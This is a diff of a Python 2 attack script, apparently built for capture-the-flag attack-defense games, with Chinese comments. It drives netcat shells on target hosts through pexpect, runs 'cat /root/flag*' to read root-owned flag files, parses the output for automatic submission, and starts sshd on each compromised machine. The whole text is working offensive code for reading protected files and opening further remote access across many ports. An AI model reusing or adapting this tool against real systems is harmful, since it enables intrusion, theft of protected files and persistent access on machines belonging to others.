@@ -3,7 +3,7 @@
 import pexpect
 import optparse
 import os
-
+import re
 parser = optparse.OptionParser()
 parser.add_option('-t', dest='target', type='string')
 
@@ -27,7 +27,6 @@ for port in port_list:
         print '[X] %s:%d close' % (target, port)
         continue
 
-    print
 
     # 储存的路径
     path = os.path.join(os.getcwd(), 'nc_flag_%s_%d' % (target, port))
@@ -37,8 +36,13 @@ for port in port_list:
 
         child.logfile_read = f
 
-        # 获取flag值
-        child.sendline('cat /root/flag*')
+        # 因为netcat的交互原因,只能用这种方法获取到flag值
+        # 下面的再次读文件获取flag值的方法应该会影响速度
+        # 直接获取到flag可以配合自动提交flag值用
+        child.sendline('''cat /root/flag*|awk {'print "flag",$0'} ''')
+        child.expect(r'flag .*')
+        flag = re.search('flag (.*)', child.after).group(1)
+        print '[Flag] %s:%d - %s' % (target, port, flag)
 
         # 没多大用
         child.sendline('/sbin/service sshd start')
@@ -71,8 +75,8 @@ for port in port_list:
         print '[File] %s:%d : %s' % (target, port, path)
 
     # 因为netcat和pexpect的原因,只能这么获取flag值
-    with open(path, 'r') as f:
-        flag = f.readlines()[1].replace('\n', '')
-        print '[Flag] %s:%d - %s' % (target, port, flag)
-        print '[Usage] python auto_flag.py -t %s -f %s' % (target, flag)
-        print
+    # with open(path, 'r') as f:
+        # flag = f.readlines()[1].replace('\n', '')
+        # print '[Flag] %s:%d - %s' % (target, port, flag)
+        # print '[Usage] python auto_flag.py -t %s -f %s' % (target, flag)
+        # print
